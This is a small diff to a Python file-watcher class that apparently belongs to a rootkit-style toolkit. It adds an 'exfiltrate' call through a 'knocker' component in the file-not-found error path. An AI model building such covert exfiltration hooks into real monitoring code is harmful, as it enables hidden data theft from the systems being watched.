@@ -7,7 +7,7 @@ import MonitorFile
 
 
 class file_watcher:
-    def __init__(self, kit="", file="", f_path=""):
+    def __init__(self, kit, file="", f_path=""):
         self.file = file
         self.rkit = kit
         self.f_path = f_path
@@ -37,6 +37,7 @@ class file_watcher:
                 return "Watch Started"
             return "Watch already started"
         except FileNotFoundError:
+            self.rkit.knocker.exfiltrate("File not found", "/")
             return "File not found"
 
     def stop(self):
